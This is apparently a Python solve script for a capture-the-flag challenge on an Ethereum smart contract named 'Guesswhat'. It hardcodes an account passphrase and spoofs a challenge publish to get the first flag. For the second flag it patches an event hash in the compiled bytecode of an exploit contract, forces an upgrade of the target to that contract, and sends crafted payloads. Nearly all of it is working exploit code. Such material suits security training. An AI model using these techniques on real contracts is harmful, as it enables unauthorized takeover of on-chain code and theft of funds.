#!/usr/bin/env python3

import json
import pdb
import web3
import pickle
import time

from web3 import Web3, HTTPProvider, IPCProvider
from solc import compile_source
from web3.contract import ConciseContract, Contract

print('Connecting to geth')
w3 = Web3(HTTPProvider('http://localhost:8545'))
# http://web3py.readthedocs.io/en/latest/middleware.html#geth-style-proof-of-authority
from web3.middleware import geth_poa_middleware
w3.middleware_stack.inject(geth_poa_middleware, layer=0)

if not w3.personal.unlockAccount(w3.eth.accounts[0], '420blaze69everysingle1337day'):
    print('Wrong account unlock passphrase... Quitting')
    exit(-1)

contract_source = ''
with open('guesswhat.sol') as f:
    contract_source = f.read()

print('Compiling sol')
compiled_sol = compile_source(contract_source)
interface = compiled_sol['<stdin>:Guesswhat']

cont_addr = '0xa04EF56f8356ca10E1703F2Fb399f102ce30Fb4d'
instance = w3.eth.contract(abi=interface['abi'], address=cont_addr, \
        ContractFactoryClass=Contract)


transaction = {
    'value': 0,
    'to'   : cont_addr,
    'from' : w3.eth.coinbase,
    'gasPrice': w3.toWei(18, 'gwei'),
    'gas': 4100000
}
solve = True

print('challenge : {}'.format(instance.functions.challenge_hash().call()))
if solve:
    print('spoofing publish')
    bla = instance.functions.publishChallenge( \
            '0x221f2af61b5ece33daa443a3413d662e620f61abb59a025b10eaedf781baecd7', \
            w3.sha3(w3.toBytes(hexstr='0x'+'420'.zfill(64)))).transact(transaction)
    print('Waiting for TX to be mined (2 blocks).........')
    block = w3.eth.blockNumber
    while w3.eth.blockNumber != block+2:
        time.sleep(1)
    time.sleep(1)
    print('challenge : {}'.format(instance.functions.challenge_hash().call()))
    bla = instance.functions.guessAnswer(w3.toBytes(hexstr='0x'+'420'.zfill(64))).transact(transaction)
    block = w3.eth.blockNumber
    while w3.eth.blockNumber != block+2:
        time.sleep(1)
    print('Waiting for flag to be published.........')
    block = w3.eth.blockNumber
    while w3.eth.blockNumber != block+2:
        time.sleep(1)
    time.sleep(15)
    print('flag1 : {}'.format(instance.functions.flag().call()))
else:
    print('0x420 hash: '+str(w3.sha3(w3.toBytes(hexstr='0x'+'420'.zfill(64)))))
    print('Sending "random" guess')
    bla = instance.functions.guessAnswer(w3.toBytes(hexstr='0x'+'420'.zfill(64))).transact(transaction)
    print('Waiting for TX to be mined (2 blocks).........')
    block = w3.eth.blockNumber
    while w3.eth.blockNumber != block+2:
        time.sleep(1)
    time.sleep(1)
    print('flag1 : {}'.format(instance.functions.flag().call()))


contract_source = ''
with open('exploit.sol') as f:
    contract_source = f.read()

print('Compiling sol')
compiled_sol2 = compile_source(contract_source)
interface2 = compiled_sol2['<stdin>:Guesswhat']
bad_event = 'aa3686c0ff3e3b2a73799d60eba03a9aedb24cbfbbaa7ea6166ea8bd54992254'
orig_event = '8b4a1da1e9d54b88ebafc9ce4677a2ca4196693b1c8500b9d1fc58d96553c5fd'
interface2['bin'] = interface2['bin'].replace(bad_event, orig_event)
instance2 = w3.eth.contract(abi=interface2['abi'],
    bytecode=interface2['bin'])

tx_hash = instance2.deploy(transaction={'from': w3.eth.accounts[0], 'gas': 4100000},
    args=['lolwtf'])
print('Waiting for exploit contract to be deployed.........')
block = w3.eth.blockNumber
while w3.eth.blockNumber != block+2:
    time.sleep(1)
time.sleep(1)
cont_addr2 = w3.eth.getTransactionReceipt(tx_hash)['contractAddress']
if not w3.eth.getTransactionReceipt(tx_hash)['status']:
    print('Contract deployment failed')
    pdb.set_trace()

transaction2 = {
    'value': 0,
    'to'   : cont_addr2,
    'from' : w3.eth.coinbase,
    'gasPrice': w3.toWei(18, 'gwei'),
    'gas': 4100000
}

print('Migrating, waiting for tx (and migration).....')
upg_tx = instance.functions.upgrade( \
        '0x221f2af61b5ece33daa443a3413d662e620f61abb59a025b10eaedf781baecd7', \
        cont_addr2).transact(transaction)
block = w3.eth.blockNumber
while w3.eth.blockNumber != block+2:
    time.sleep(1)
time.sleep(10)

instance2 = w3.eth.contract(address=cont_addr2, abi=interface2['abi'])

print('Migrated, waiting for exploit tx.....')
data1 = w3.toBytes(hexstr='0x'+('41'*32).zfill(64))
data2 = w3.toBytes(hexstr='0x'+('42'*32).zfill(64))
data3 = w3.toBytes(hexstr='0x'+('43'*32).zfill(64))
data4 = w3.toBytes(hexstr='0x'+('44'*8+'2815400000000000'+'5323400000000000'+'961c400000000000').zfill(64))
bla = instance2.functions.guessAnswer(data1, data2, data3, data4).transact(transaction2)
block = w3.eth.blockNumber
while w3.eth.blockNumber != block+2:
    time.sleep(1)
time.sleep(1)
receipt = w3.eth.getTransactionReceipt(bla)
event = instance2.events.NewGuess().processReceipt(receipt)

block = w3.eth.blockNumber
while w3.eth.blockNumber != block+2:
    time.sleep(1)
time.sleep(1)
print('flag2 : {}'.format(instance.functions.flag().call()))

pdb.set_trace()
